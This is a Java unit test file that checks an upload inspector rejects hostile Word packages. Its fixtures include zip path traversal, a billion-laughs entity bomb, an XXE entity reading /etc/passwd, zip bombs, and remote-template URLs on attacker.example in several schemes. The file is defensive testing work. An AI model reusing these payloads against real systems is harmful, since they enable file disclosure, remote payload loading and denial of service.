package io.github.vihuynh72.brownie.core.artifact;

import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Direct unit tests for the classification and package-bound logic, using
 * the package-private overload so entry-count and uncompressed-size bounds
 * can be proven with small thresholds rather than real hundred-megabyte
 * payloads.
 */
class ArtifactContentInspectorTest {

    @Test
    void classifiesAWellFormedOoxmlPackageAsDocx() throws IOException {
        byte[] docx = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", "<w:document/>"));

        assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(stream(docx), 1_000_000, 500));
    }

    @Test
    void classifiesAPdfSignatureAsPdf() throws IOException {
        byte[] pdf = "%PDF-1.7\n1 0 obj".getBytes();

        assertEquals(SupportedMediaType.PDF, ArtifactContentInspector.inspect(stream(pdf), 1_000_000, 500));
    }

    @Test
    void classifiesOrdinaryTextAsPlainText() throws IOException {
        byte[] text = "Meeting notes: decided to ship it.".getBytes();

        assertEquals(SupportedMediaType.PLAIN_TEXT, ArtifactContentInspector.inspect(stream(text), 1_000_000, 500));
    }

    @Test
    void aZipWithoutTheOoxmlManifestIsRejected() throws IOException {
        byte[] plainZip = zipOf(entry("readme.txt", "just a zip"));

        assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(plainZip), 1_000_000, 500));
    }

    @Test
    void aZipEntryNameEscapingThePackageIsRejected() throws IOException {
        byte[] malicious = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("../outside.txt", "escaped"));

        assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(malicious), 1_000_000, 500));
    }

    @Test
    void anAbsoluteZipEntryPathIsRejected() throws IOException {
        byte[] malicious = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("/etc/passwd", "escaped"));

        assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(malicious), 1_000_000, 500));
    }

    @Test
    void aPackageWithMoreEntriesThanAllowedIsRejected() throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            for (int i = 0; i < 5; i++) {
                zip.putNextEntry(new ZipEntry("part" + i + ".xml"));
                zip.write("<x/>".getBytes());
                zip.closeEntry();
            }
        }

        assertThrows(
                ArtifactTooLargeException.class,
                // Real entry count is 6; a max of 3 makes the bound cheap to trigger.
                () -> ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 1_000_000, 3));
    }

    @Test
    void aPackageThatExpandsBeyondTheUncompressedLimitIsRejected() throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/document.xml"));
            // Highly compressible, deliberately larger than the tiny test cap below, and well-formed: the limit has
            // to hold while the part is being read as XML, not only when it is merely counted.
            zip.write(("<w:t>" + "A".repeat(10_000) + "</w:t>").getBytes());
            zip.closeEntry();
        }

        assertThrows(
                ArtifactTooLargeException.class,
                () -> ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 1_000, 500));
    }

    @Test
    void randomBinaryDataMatchesNoSupportedType() {
        byte[] binary = {0x7F, 0x45, 0x4C, 0x46, 0x00, 0x01, 0x02};

        assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(binary), 1_000_000, 500));
    }

    private static InputStream stream(byte[] bytes) {
        return new ByteArrayInputStream(bytes);
    }

    @Test
    void aPackageThatNamesTheSamePartTwiceIsRejectedEvenWhenOnlyTheCaseDiffers() throws IOException {
        byte[] differingInCase = zipOf(
                entry("[Content_Types].xml", "<Types/>"),
                entry("word/document.xml", "<w:document>what a scanner reads</w:document>"),
                entry("word/Document.xml", "<w:document>what Word opens</w:document>"));

        for (byte[] twice : java.util.List.of(withTheSamePartTwice(), differingInCase)) {
            UnsupportedArtifactTypeException refused = assertThrows(
                    UnsupportedArtifactTypeException.class,
                    () -> ArtifactContentInspector.inspect(stream(twice), 1_000_000, 500));
            assertTrue(refused.getMessage().contains("more than once"));
        }
    }

    @Test
    void aPartThatDeclaresADocumentTypeIsRejectedBeforeAnyEntityCouldBeExpanded() throws IOException {
        String billionLaughs = "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">"
                + "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><w:document>&lol2;</w:document>";
        byte[] docx = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", billionLaughs));

        UnsupportedArtifactTypeException refused = assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(docx), 1_000_000, 500));
        assertTrue(refused.getMessage().contains("document type"));
    }

    @Test
    void aPartThatNamesAnExternalEntityIsRejectedAndNothingIsFetched() throws IOException {
        String xxe = "<?xml version=\"1.0\"?><!DOCTYPE d [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><w:document>&x;</w:document>";
        byte[] docx = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", xxe));

        assertThrows(UnsupportedArtifactTypeException.class, () -> ArtifactContentInspector.inspect(stream(docx), 1_000_000, 500));
    }

    @Test
    void aPartNestedDeeperThanAnyRealDocumentIsRejected() throws IOException {
        int depth = PackagePartInspector.MAX_ELEMENT_DEPTH + 1;
        String deep = "<a>".repeat(depth) + "</a>".repeat(depth);
        String asDeepAsAllowed = "<a>".repeat(depth - 1) + "</a>".repeat(depth - 1);

        byte[] tooDeep = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", deep));
        byte[] allowed = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", asDeepAsAllowed));

        UnsupportedArtifactTypeException refused = assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(tooDeep), 10_000_000, 500));
        assertTrue(refused.getMessage().contains("deep"));
        assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(stream(allowed), 10_000_000, 500));
    }

    @Test
    void aPackageThatAsksItsReaderToFetchSomethingFromANetworkIsRejectedButOrdinaryDocumentsAreNot() throws IOException {
        String template = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
        for (String remote : java.util.List.of(
                "https://attacker.example/payload.dotm", "\\\\attacker.example\\share\\payload.dotm", "file://attacker.example/share/payload.dotm")) {
            byte[] hostile = zipOf(
                    entry("[Content_Types].xml", "<Types/>"),
                    entry("word/_rels/settings.xml.rels", relationships(template, remote)));
            UnsupportedArtifactTypeException refused = assertThrows(
                    UnsupportedArtifactTypeException.class,
                    () -> ArtifactContentInspector.inspect(stream(hostile), 1_000_000, 500),
                    remote);
            assertTrue(refused.getMessage().contains("on a network"));
        }

        // What nearly every document written in Word contains: the template it was started from, on the author's own
        // disk. And a link in the text, which is a link and nothing more.
        byte[] ordinary = zipOf(
                entry("[Content_Types].xml", "<Types/>"),
                entry("word/_rels/settings.xml.rels", relationships(template, "file:///C:/Users/someone/AppData/Roaming/Microsoft/Templates/Normal.dotm")),
                entry("word/_rels/document.xml.rels", relationships(
                        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink", "https://example.org/agenda")));
        assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(stream(ordinary), 1_000_000, 500));
    }

    private static String relationships(String type, String externalTarget) {
        return "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                + "<Relationship Id=\"rId1\" Type=\"" + type + "\" Target=\"" + externalTarget + "\" TargetMode=\"External\"/>"
                + "<Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\""
                + " Target=\"styles.xml\"/></Relationships>";
    }

    /**
     * The stricter a gate is, the more it matters that it opens for what it is there to let in: every real Word
     * file this repository ships or expects, read under the limits production uses.
     */
    @Test
    void everyRealDocumentInTheRepositoryStillPasses() throws IOException {
        java.nio.file.Path fixtures = java.nio.file.Path.of("").toAbsolutePath().getParent().getParent().resolve("fixtures/public");
        java.util.List<java.nio.file.Path> documents;
        try (java.util.stream.Stream<java.nio.file.Path> files = java.nio.file.Files.walk(fixtures)) {
            documents = files.filter(file -> file.toString().endsWith(".docx")).toList();
        }
        assertTrue(documents.size() >= 6, "expected the public fixtures to be present, found " + documents.size());
        for (java.nio.file.Path document : documents) {
            try (InputStream content = java.nio.file.Files.newInputStream(document)) {
                assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(content), document.toString());
            }
        }
    }

    @Test
    void aPartThatIsNotWellFormedIsRejectedWithoutQuotingIt() throws IOException {
        byte[] broken = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/document.xml", "<w:document><secret-looking-text></w:document>"));

        UnsupportedArtifactTypeException refused = assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(broken), 1_000_000, 500));
        assertTrue(refused.getMessage().contains("well-formed"));
        assertFalse(refused.getMessage().contains("secret-looking-text"));
    }

    @Test
    void aPackageThatExpandsImplausiblyFarForItsSizeIsRejectedWellBeforeTheSizeLimit() throws IOException {
        // Sixteen megabytes of one repeated byte compress to a few kilobytes: about a thousand to one.
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/media/image1.bin"));
            byte[] block = new byte[1024 * 1024];
            for (int i = 0; i < 16; i++) {
                zip.write(block);
            }
            zip.closeEntry();
        }

        ArtifactTooLargeException refused = assertThrows(
                ArtifactTooLargeException.class,
                () -> ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 200L * 1024 * 1024, 500));
        assertTrue(refused.getMessage().contains("implausibly"));
    }

    @Test
    void somethingIncompressiblePutInFrontDoesNotHideAPartThatExpandsImplausiblyFar() throws IOException {
        // Nine megabytes that do not compress keep the package as a whole near three to one.
        byte[] noise = new byte[9 * 1024 * 1024];
        new java.util.Random(7).nextBytes(noise);
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/media/image1.bin"));
            zip.write(noise);
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/media/image2.bin"));
            byte[] block = new byte[1024 * 1024];
            for (int i = 0; i < 16; i++) {
                zip.write(block);
            }
            zip.closeEntry();
        }

        ArtifactTooLargeException refused = assertThrows(
                ArtifactTooLargeException.class,
                () -> ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 200L * 1024 * 1024, 500));
        assertTrue(refused.getMessage().contains("implausibly"));
    }

    @Test
    void cuttingTheSameContentIntoManySmallPartsDoesNotHideItEither() throws IOException {
        byte[] noise = new byte[2 * 1024 * 1024];
        new java.util.Random(11).nextBytes(noise);
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/media/image0.bin"));
            zip.write(noise);
            zip.closeEntry();
            byte[] block = new byte[1024 * 1024];
            for (int i = 1; i <= 20; i++) {
                zip.putNextEntry(new ZipEntry("word/media/image" + i + ".bin"));
                zip.write(block);
                zip.closeEntry();
            }
        }

        ArtifactTooLargeException refused = assertThrows(
                ArtifactTooLargeException.class,
                () -> ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 200L * 1024 * 1024, 500));
        assertTrue(refused.getMessage().contains("implausibly"));
    }

    @Test
    void aFewMegabytesOfBlankPictureInAnOtherwiseOrdinaryDocumentAreNotABomb() throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            zip.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zip.write("<Types/>".getBytes());
            zip.closeEntry();
            zip.putNextEntry(new ZipEntry("word/media/blank.bmp"));
            zip.write(new byte[6 * 1024 * 1024]);
            zip.closeEntry();
        }

        assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(stream(buffer.toByteArray()), 200L * 1024 * 1024, 500));
    }

    @Test
    void everyWayOfNamingSomewhereOnANetworkIsSeenAndAPathOnTheAuthorsOwnDiskIsNot() {
        for (String network : new String[] {
                "https://attacker.example/payload.dotm",
                "mhtml:http://attacker.example/evil!x-usc:file:///x",
                "ms-word:ofe|u|http://attacker.example/evil.docx",
                "file://attacker.example/share/payload.dotm",
                "file:////attacker.example/share/payload.dotm",
                "file:///%5c%5cattacker.example/share/payload.dotm",
                "file:///\\\\attacker.example\\share\\payload.dotm",
                "\\\\attacker.example\\share\\payload.dotm",
                "//attacker.example/share/payload.dotm",
                "file://localhost//attacker.example/share/payload.dotm",
                "localhost:8080/payload.dotm",
                "  HTTP://attacker.example/x",
                "ftp://attacker.example/x",
                "file:///C:/ok%zz"}) {
            assertTrue(PackagePartInspector.isOnANetwork(network), network);
        }
        for (String local : new String[] {
                "file:///C:\\Users\\someone\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm",
                "file:///C:/Users/some%20one/Templates/Letter.dotx",
                "file:/Users/someone/Templates/Letter.dotx",
                "C:\\Templates\\Letter.dotx",
                "file://localhost/Users/someone/Library/Templates/Normal.dotm",
                "Book1.xlsx!Sheet1!R1C1:R5C3",
                "Normal.dotm",
                "../templates/Letter.dotx",
                ""}) {
            assertFalse(PackagePartInspector.isOnANetwork(local), local);
        }
    }

    @Test
    void aRemoteTemplateHiddenInsideAnotherSchemeIsRejected() throws IOException {
        String relationships = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                + "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\""
                + " Target=\"mhtml:http://attacker.example/evil!x-usc:file:///x\" TargetMode=\"External\"/></Relationships>";
        byte[] hostile = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/_rels/settings.xml.rels", relationships));

        UnsupportedArtifactTypeException refused = assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(hostile), 1_000_000, 500));
        assertTrue(refused.getMessage().contains("network"));
    }

    @Test
    void propertiesStoredTheWayGeneratedDocumentsStoreThemAreReadAsXmlAndAnEmbeddedPictureIsNot() throws IOException {
        String withDocumentType = "<?xml version=\"1.0\"?><!DOCTYPE d [<!ENTITY x \"y\">]><d>&x;</d>";
        String drawing = "<?xml version=\"1.0\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\""
                + " \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg xmlns=\"http://www.w3.org/2000/svg\"/>";

        byte[] hostile = zipOf(
                entry("[Content_Types].xml", "<Types/>"),
                entry("package/services/metadata/core-properties/0f1e.psmdcp", withDocumentType));
        byte[] ordinary = zipOf(entry("[Content_Types].xml", "<Types/>"), entry("word/media/image1.svg", drawing));

        UnsupportedArtifactTypeException refused = assertThrows(
                UnsupportedArtifactTypeException.class,
                () -> ArtifactContentInspector.inspect(stream(hostile), 1_000_000, 500));
        assertTrue(refused.getMessage().contains("document type"));
        assertEquals(SupportedMediaType.DOCX, ArtifactContentInspector.inspect(stream(ordinary), 1_000_000, 500));
    }

    /**
     * {@link ZipOutputStream} refuses to write one name twice, so the second part is written under a name one
     * letter off and the finished bytes are corrected, in the entry's own header and in the archive's directory.
     * The names are the same length, so nothing else in the archive moves.
     */
    private static byte[] withTheSamePartTwice() throws IOException {
        byte[] almost = zipOf(
                entry("[Content_Types].xml", "<Types/>"),
                entry("word/document.xml", "<w:document>what a scanner reads</w:document>"),
                entry("word/documenX.xml", "<w:document>what Word opens</w:document>"));
        String text = new String(almost, java.nio.charset.StandardCharsets.ISO_8859_1);
        return text.replace("word/documenX.xml", "word/document.xml").getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
    }

    private static java.util.Map.Entry<String, String> entry(String name, String content) {
        return java.util.Map.entry(name, content);
    }

    @SafeVarargs
    private static byte[] zipOf(java.util.Map.Entry<String, String>... entries) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            for (var entry : entries) {
                zip.putNextEntry(new ZipEntry(entry.getKey()));
                zip.write(entry.getValue().getBytes());
                zip.closeEntry();
            }
        }
        return buffer.toByteArray();
    }
}
